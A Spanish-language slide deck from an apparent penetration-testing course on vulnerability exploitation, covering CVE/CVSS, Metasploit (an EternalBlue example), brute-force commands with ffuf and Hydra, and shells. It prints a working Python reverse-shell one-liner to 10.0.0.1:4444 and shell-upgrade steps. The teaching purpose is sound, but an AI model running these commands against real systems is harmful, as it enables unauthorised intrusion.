+++
title = "Explotación de vulnerabilidades"
outputs = ["Reveal"]
+++

## Explotación de vulnerabilidades
### Técnicas y Prácticas Seguras de Explotación

---

### El plan para hoy

- Entendiendo CVEs y CVSS
- Priorización de vulnerabilidades
- Aprovechamiento de la fase de reconocimiento
- Búsqueda y validación de exploits
- Metasploit Framework
- Técnicas de acceso inicial
- Tipos de shells y su uso
- Mejores prácticas de explotación

{{% note %}}
La explotación de vulnerabilidades es una fase crítica que requiere:
- Metodología sistemática y organizada
- Comprensión profunda de los hallazgos previos
- Conocimiento de las implicaciones de seguridad
- Documentación detallada de cada paso
- Prácticas seguras y controladas

Es fundamental mantener un enfoque ético y profesional, trabajando siempre dentro del alcance autorizado y siguiendo las mejores prácticas de la industria.
{{% /note %}}

---

{{% section %}}

### CVE y CVSS

CVE (Common Vulnerabilities and Exposures):
- Identificador único
- Descripción estandarizada
- Referencias técnicas
- Estado de parche

CVSS (Common Vulnerability Scoring System):
- Puntuación de 0.0 a 10.0
- Métricas base, temporales y ambientales
- Vectores de ataque
- Impacto potencial

{{% note %}}
Comprensión de CVE y CVSS:

CVE:
- Sistema de identificación estándar
- Formato: CVE-YEAR-XXXX
- Mantenido por MITRE
- Facilita el seguimiento y referencia
- Base de conocimiento común

CVSS v3.1:
- Métricas Base:
  * Vector de ataque (Network, Adjacent, Local, Physical)
  * Complejidad (Low, High)
  * Privilegios requeridos (None, Low, High)
  * Interacción del usuario (None, Required)
  * Alcance (Unchanged, Changed)
  * Confidencialidad (None, Low, High)
  * Integridad (None, Low, High)
  * Disponibilidad (None, Low, High)

La comprensión de estas métricas es crucial para priorizar vulnerabilidades.
{{% /note %}}

---

### Búsqueda por CVE

Fuentes principales:
```bash
# Búsqueda en Metasploit
msf> search cve:2021-44228

# Búsqueda en SearchSploit
searchsploit -c CVE-2021-44228

# Base de datos NVD
https://nvd.nist.gov/vuln/search
```

{{% note %}}
Estrategias de búsqueda efectivas:

Recursos principales:
- National Vulnerability Database (NVD)
- Exploit Database
- Metasploit Database
- GitHub Security Lab
- Vendor Security Advisories

Proceso de investigación:
1. Identificar CVE específico
2. Verificar detalles en NVD
3. Buscar PoCs disponibles
4. Validar aplicabilidad
5. Evaluar riesgos de explotación

Es importante verificar la información en múltiples fuentes para garantizar precisión y actualidad.
{{% /note %}}

---

### Priorización de Vulnerabilidades

Por impacto potencial:
1. RCE (Remote Code Execution)
   - CVSS 9.0-10.0
   - Control total del sistema
2. Escalación de privilegios
   - CVSS 7.0-9.0
   - Elevación de acceso
3. SQLi (SQL Injection)
   - CVSS 6.0-9.0
   - Acceso a datos
4. XSS (Cross-Site Scripting)
   - CVSS 4.0-7.0
   - Ataque a usuarios

{{% note %}}
La priorización efectiva es crucial:

Remote Code Execution (RCE):
- Mayor impacto potencial
- Control completo del sistema
- Bypass de controles de seguridad
- Base para pivoting
- CVSS típicamente 9.0-10.0

Escalación de Privilegios:
- Elevación de acceso local
- Bypass de restricciones
- Acceso a datos sensibles
- CVSS típicamente 7.0-9.0

SQL Injection:
- Acceso a base de datos
- Extracción de información
- Modificación de datos
- CVSS típicamente 6.0-9.0

XSS y otros:
- Impacto en usuarios
- Robo de sesiones
- Phishing dirigido
- CVSS típicamente 4.0-7.0

La priorización debe considerar:
- Contexto del objetivo
- Alcance del engagement
- Recursos disponibles
- Tiempo asignado
- Riesgos asociados
{{% /note %}}

{{% /section %}}

---

{{% section %}}

### Aprovechamiento del Reconocimiento

Elementos clave:
- Versiones de software identificadas
- Configuraciones por defecto
- Servicios expuestos
- Tecnologías obsoletas
- CVEs aplicables

{{% note %}}
El reconocimiento previo nos proporciona información vital:

- Las versiones de software pueden revelar:
  - Vulnerabilidades conocidas
  - Parches faltantes
  - Configuraciones inseguras por defecto
  - Limitaciones de seguridad
  - CVEs específicos

- Los servicios expuestos pueden indicar:
  - Puntos de entrada potenciales
  - Vectores de ataque viables
  - Superficies de ataque expandidas
  - Configuraciones incorrectas
  - Vulnerabilidades comunes

Es crucial mantener un registro detallado de estos hallazgos para una explotación efectiva y controlada.
{{% /note %}}

---

### Análisis de Versiones

Proceso sistemático:
1. Identificar versión exacta
2. Buscar vulnerabilidades conocidas
3. Verificar disponibilidad de exploits
4. Validar aplicabilidad
5. Evaluar riesgos y CVSS

{{% note %}}
El análisis de versiones es un proceso metódico:

Fuentes de información:
- Base de datos CVE
- ExploitDB
- Security advisories
- Foros de seguridad
- Repositorios de GitHub

Consideraciones importantes:
- Verificar la exactitud de la versión
- Considerar parches no documentados
- Evaluar dependencias afectadas
- Analizar el contexto del sistema
- Revisar puntuaciones CVSS

La precisión en esta fase es crucial para evitar falsos positivos y optimizar el tiempo de prueba.
{{% /note %}}

{{% /section %}}

---

{{% section %}}

### Metasploit Framework

Componentes principales:
- msfconsole
- Módulos de exploits
- Módulos auxiliares
- Payloads
- Post-explotación

{{% note %}}
Metasploit Framework es una herramienta fundamental:

Arquitectura:
- Librería de exploits verificados
- Framework modular y extensible
- Base de datos integrada
- Sistema de payloads flexible
- Herramientas de post-explotación

Funcionalidades clave:
- Gestión de sesiones
- Generación de shellcode
- Evasión de antivirus
- Pivoting de red
- Escalación de privilegios

La comprensión profunda de Metasploit es esencial para un pentesting efectivo.
{{% /note %}}

---

### Uso Básico de Metasploit

Comandos esenciales:
```bash
# Iniciar Metasploit
msfconsole

# Búsqueda de módulos
search type:exploit platform:windows ms17-010

# Uso de módulos
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.10
exploit
```

{{% note %}}
Workflow típico en Metasploit:

1. Inicialización:
   - Actualizar base de datos
   - Verificar conexión de red
   - Configurar workspace

2. Búsqueda de exploits:
   - Por CVE
   - Por servicio
   - Por plataforma
   - Por tipo

3. Configuración:
   - Parámetros requeridos
   - Opciones avanzadas
   - Selección de payload
   - Ajustes de targeting

4. Ejecución:
   - Verificación de requisitos
   - Test de conectividad
   - Monitoreo de proceso
   - Gestión de sesiones
{{% /note %}}

{{% /section %}}

---

{{% section %}}

### Credenciales por Defecto

Recursos comunes:
- default-password.info
- cirt.net
- datarecovery.com/rd/default-passwords

{{% note %}}
Las credenciales por defecto son un vector común:

Tipos de sistemas afectados:
- Dispositivos IoT
- Routers y switches
- Aplicaciones web
- Sistemas embebidos
- Servicios cloud mal configurados

Mejores prácticas:
- Mantener bases de datos actualizadas
- Verificar múltiples fuentes
- Documentar intentos realizados
- Considerar variaciones comunes
- Respetar políticas de intentos

Es importante mantener un registro de los intentos para evitar bloqueos de cuenta.
{{% /note %}}

---

### Ataques de Diccionario

Ejemplos prácticos:
```bash
# FFuf para fuzzing web
ffuf -w wordlist.txt -u http://target.com/FUZZ
ffuf -w users.txt:W1,pass.txt:W2 -u http://target.com/login -X POST -d "user=W1&pass=W2"

# Hydra para SSH
hydra -l admin -P rockyou.txt ssh://target.com
hydra -L users.txt -P passes.txt ssh://target.com -t 4
```

{{% note %}}
Los ataques de diccionario requieren planificación:

FFuf para Web:
- Fuzzing de directorios
- Parámetros POST/GET
- Headers personalizados
- Filtrado de respuestas
- Manejo de sesiones

Hydra para SSH:
- Control de threads
- Manejo de timeouts
- Filtrado de respuestas
- Formato de credenciales
- Logs detallados

Consideraciones generales:
- Selección de wordlists apropiadas
- Velocidad y delays
- Políticas de bloqueo
- Monitoreo de logs
- Documentación de resultados
{{% /note %}}

{{% /section %}}

---

{{% section %}}

### Obtención de Shell

Tipos principales:
- Reverse shells
- Bind shells
- Web shells

```bash
# Ejemplo de reverse shell en Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Listener con netcat
nc -lvnp 4444
```

{{% note %}}
Las shells proporcionan acceso interactivo al sistema:

Reverse Shells:
- Inician conexión desde el objetivo
- Bypass firewalls comunes
- Requieren listener externo
- Más comunes en pentesting
- Variedad de implementaciones

Bind Shells:
- Escuchan en el objetivo
- Requieren conectividad directa
- Más detectables
- Útiles en ciertos escenarios
- Simples de implementar

Web Shells:
- Operan vía HTTP/HTTPS
- Bypass restricciones de red
- Persistencia simple
- Múltiples lenguajes
- Difíciles de detectar
{{% /note %}}

---

### Mejora de Shell

Técnicas comunes:
```bash
# Obtener TTY completa
python -c 'import pty; pty.spawn("/bin/bash")'

# Configuración de terminal
export TERM=xterm
stty raw -echo; fg

# Después de 'stty raw -echo; fg':
# 1. Presionar Enter
# 2. Presionar Ctrl + Z
# 3. stty raw -echo; fg
# 4. Presionar Enter dos veces
```

{{% note %}}
La mejora de shell es crucial para:

Proceso detallado:
1. Spawn TTY inicial con Python
2. Configurar TERM para funcionalidad
3. Desactivar echo local
4. Background y foreground para reset
5. Configuración final de terminal

Después de 'stty raw -echo; fg':
- Ctrl + Z envía la shell a background
- 'stty raw -echo' configura la terminal local
- 'fg' trae la shell a foreground
- Enters finales restauran el prompt

Resultado final:
- Shell completamente interactiva
- Soporte para Ctrl+C
- Historial funcional
- Autocompletado
- Edición de línea
{{% /note %}}

{{% /section %}}

---

### Prácticas Seguras

Principios fundamentales:
1. Documentación detallada
2. Control de cambios
3. Respaldos cuando sea posible
4. Monitoreo constante
5. Plan de rollback

{{% note %}}
Las prácticas seguras son fundamentales para una explotación controlada:

Documentación exhaustiva:
- Registro cronológico de acciones
- Capturas de pantalla
- Hashes de archivos
- Logs de comandos
- Estado inicial del sistema

Control de cambios:
- Versión de exploits usados
- Modificaciones realizadas
- Archivos transferidos
- Credenciales utilizadas
- Configuraciones alteradas

Respaldos y snapshots:
- Configuraciones críticas
- Bases de datos
- Archivos modificados
- Estados de servicios
- Logs del sistema

Monitoreo activo:
- Uso de recursos
- Tráfico de red
- Logs de seguridad
- Comportamiento del sistema
- Respuesta de servicios

Plan de contingencia:
- Procedimientos de rollback
- Puntos de restauración
- Contactos de emergencia
- Procedimientos de escalación
- Criterios de abort

Consideraciones legales:
- Alcance autorizado
- Evidencia forense
- Cadena de custodia
- Confidencialidad
- Cumplimiento normativo

Gestión de riesgos:
- Evaluación de impacto
- Medidas de mitigación
- Puntos de no retorno
- Criterios de éxito/fallo
- Planes de contingencia

Comunicación:
- Reportes de progreso
- Escalación de incidentes
- Coordinación con equipo
- Notificación de hallazgos
- Documentación final
{{% /note %}}

---

### ¿Preguntas?
